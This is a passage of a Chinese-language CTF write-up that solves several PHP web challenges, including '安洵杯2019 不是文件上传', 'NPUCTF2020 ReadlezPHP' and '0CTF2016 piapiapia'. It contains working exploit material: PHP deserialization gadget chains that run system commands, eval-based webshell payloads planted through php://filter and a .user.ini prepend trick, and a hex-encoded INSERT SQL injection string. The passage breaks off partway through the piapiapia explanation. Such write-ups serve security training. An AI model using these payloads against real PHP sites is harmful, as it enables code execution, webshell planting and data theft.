<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$testB = <span class="keyword">new</span> B();</span><br><span class="line">$testB-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">$testA = <span class="keyword">new</span> A($testB, <span class="string">&quot;miao&quot;</span>);</span><br><span class="line">$testA-&gt;autosave = <span class="number">0</span>;</span><br><span class="line">$testA-&gt;cache = [<span class="string">&#x27;aaq&#x27;</span> =&gt; <span class="string">&#x27;`cat /flag &gt; ./flag.xml`&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($testA)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>首先autosave要为0，<code>$testB-&gt;options['serialize']</code>要为system函数，此时我们对最后的写文件没什莫要求了，但必须要执行到<code>$data = $this-&gt;serialize($value);</code>这步，<code>$testA-&gt;cache</code>要为system要执行的命令。</p>
<h3 id="解法2">解法2</h3>
<p>对于前面的随机值，使用/…/即可截断，时间戳将会被认为一个目录，后面即可追加写任意文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/&quot;</span>);</span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../a.php/.&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;s&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<h3 id="解法3">解法3</h3>
<p>先可以利用跨目录，这样就可以不去爆破文件名，再利用.user.ini绕过后缀名限制。</p>
<p>上传图片马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../../aaaaaa.jpg&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;moyu&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>再上传.user.ini</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../../.user.ini&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&quot;\nauto_prepend_file=aaaaaa.jpg&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<h3 id="参考">参考</h3>
<p><a href="http://althims.com/2020/01/29/buu-new-year/">http://althims.com/2020/01/29/buu-new-year/</a></p>
<p><a href="https://www.moonback.xyz/2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/">moonback</a></p>
<h2 id="安洵杯2019-不是文件上传">[安洵杯2019]不是文件上传</h2>
<h3 id="考点-v7">考点</h3>
<ul>
<li>源码泄露</li>
<li>insert注入</li>
<li>PHP反序列化</li>
</ul>
<h3 id="解题-v7">解题</h3>
<p>在主页的源码下方有一个开发人员留的信息：<code>wowouploadimage</code>, github搜索这个名称，即可找到源码。</p>
<p>大概就三个功能：上传、查看、删除。</p>
<p>查看源码，发现有一个<code>__destruct()</code>函数，以及<code>file_get_content</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params">$path</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="literal">False</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">			<span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">		&#125;</span><br><span class="line">		$content = file_get_contents($path);</span><br><span class="line">		<span class="keyword">echo</span> $content;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="comment"># Read some config html</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>再找反序列化触发的点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$sql = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line">		$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">		<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">		    	<span class="keyword">if</span>($row[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">		    		$attr_temp = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), $row[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line">					$attr = unserialize($attr_temp);</span><br><span class="line">				&#125;</span><br><span class="line">		        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.$row[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.$row[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.$row[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>第14行反序列化的值是从数据库中取出的，而序列化的值是图片的长宽，不可控，因此只能尝试SQL注入将attr属性替换掉。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;	</span><br><span class="line">		$con = mysqli_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">		&#123; </span><br><span class="line">		    <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());</span><br><span class="line">		&#125;</span><br><span class="line">		$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">		$sql_val = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">			$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, $key);</span><br><span class="line">			$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, $value);</span><br><span class="line">			$sql_fields[] = <span class="string">&quot;`&quot;</span>.$key_temp.<span class="string">&quot;`&quot;</span>;</span><br><span class="line">			$sql_val[] = <span class="string">&quot;&#x27;&quot;</span>.$value_temp.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$sql = <span class="string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,$sql_fields)).<span class="string">&quot;) VALUES(&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,$sql_val)).<span class="string">&quot;)&quot;</span>;</span><br><span class="line">		mysqli_query($con, $sql);</span><br><span class="line">		$id = mysqli_insert_id($con);</span><br><span class="line">		mysqli_close($con);</span><br><span class="line">		<span class="keyword">return</span> $id;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>filename字段直接可控，可以在上传图片时修改filename实现注入。</p>
<p>先生成payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:6:&quot;helper&quot;:2:&#123;s:9:&quot; * ifview&quot;;b:1;s:9:&quot; * config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>由于存在替换：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$attr_temp = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), $row[<span class="string">&quot;attr&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>所以把payload变为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>因为上传的文件名中不能有双引号，所以将payload进行16进制编码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span><br></pre></td></tr></table></figure>
<p>原来的插入语句为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> images (<span class="string">`title`</span>,<span class="string">`filename`</span>,<span class="string">`ext`</span>,<span class="string">`path`</span>,<span class="string">`attr`</span>) <span class="keyword">VALUES</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a.jpg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;pic/a.jpg&#x27;</span>,<span class="string">&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>传入title的值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg</span><br></pre></td></tr></table></figure>
<p>insert注入后</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> images (<span class="string">`title`</span>,<span class="string">`filename`</span>,<span class="string">`ext`</span>,<span class="string">`path`</span>,<span class="string">`attr`</span>) <span class="keyword">VALUES</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span>),(<span class="string">&#x27;1.jpg&#x27;</span>,<span class="string">&#x27;a.jpg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;pic/a.jpg&#x27;</span>,<span class="string">&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>实际上插入了两条数据，取出的时候就会反序列化传入的数据。访问show.php得到flag。</p>
<h2 id="NPUCTF2020-ReadlezPHP">[NPUCTF2020]ReadlezPHP</h2>
<h3 id="考点-v8">考点</h3>
<ul>
<li>PHP反序列化</li>
</ul>
<h3 id="解题-v8">解题</h3>
<p>打开题目直接查看源码，发现有一个<code>time.php?source</code>，访问即得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>比较简单的反序列化题目，生成payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> HelloPhp;</span><br><span class="line">$t-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">$t-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">$ut = serialize($t);</span><br><span class="line"><span class="keyword">echo</span> $ut;</span><br></pre></td></tr></table></figure>
<p>然后全局搜索flag。</p>
<h3 id="后记-v2">后记</h3>
<p>一开始我使用eval和phpinfo()无法执行 ，报错eval函数没有定义，去<a href="https://stackoverflow.com/questions/29707896/undefined-function-eval-php">StackOverflow</a>上一看，说是eval不能用于动态函数。简单来说就是：</p>
<p>eval是因为是一个语言构造器而不是一个函数，不能被可变函数调用。</p>
<blockquote>
<p>什么是可变函数？</p>
<p>可变函数即变量名加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。如果没有就报错。<br>
可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require，eval() 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。</p>
</blockquote>
<p>所以：</p>
<ul>
<li>eval是语言构造器而不是一个函数，不能被可变函数调用</li>
<li>在php7.1版本之后 assert()默认不再可以执行代码</li>
</ul>
<h2 id="0CTF2016-piapiapia">[0CTF2016]piapiapia</h2>
<h3 id="考点-v9">考点</h3>
<ul>
<li>数组绕过</li>
<li>PHP反序列化字符逃逸</li>
</ul>
<h3 id="解题-v9">解题</h3>
<p><code>www.zip</code>下载源码，一共有6个PHP文件，其中比较重要的就下面这几个文件。</p>
<p>很明显flag在<code>config.php</code>中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>profile.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	<span class="keyword">if</span>($profile  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		$email = $profile[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>update.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($_POST[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; $_FILES[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在<code>profile.php</code>文件中有一个很明显的可以读文件的地方<code>$photo = base64_encode(file_get_contents($profile['photo']));</code>，并且<code>$profile</code>变量是经过反序列化的。那么现在的目标就是要把<code>$profile['photo']</code>的值替换成<code>config.php</code>，<code>update.php</code>中可以控制<code>$profile</code>变量。主要是下面这一段代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>传入了数组中这四个值，然后将数组序列化后带入user类中的update_profile方法中从而更改表信息。然后我们查看内容时会在<code>profile.php</code>中反序列化后返回给我们要看的信息。再去看一下<code>update_profile</code>函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params">$username, $new_profile</span>) </span>&#123;</span><br><span class="line">		$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">		$new_profile = <span class="built_in">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个防止sql注入的方法，其中他将上面五个sql关键字替换为了hacker。看起来没什么问题，但这却是我们最重要的利用点。</p>
<blockquote>
<p>任何具有一定结构的数据，<strong>如果经过了某些处理而把结构体本身的结构给打乱了</strong>，则有可能会产生漏洞。</p>
</blockquote>
<p>首先我们看一下一个正常的<code>$profile</code>经过序列化后是什么样子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile = a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;ca01h&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">39</span>:<span class="string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>我们更改的信息是要经过序列化存入数据库的，因此如果我们在信息中填入了关键字，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;s:6:&quot;select&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>这样会替换为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;s:6:&quot;hacker&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>反序列化会正常执行，因为字符没什么问题，但如果填入了where。</p>
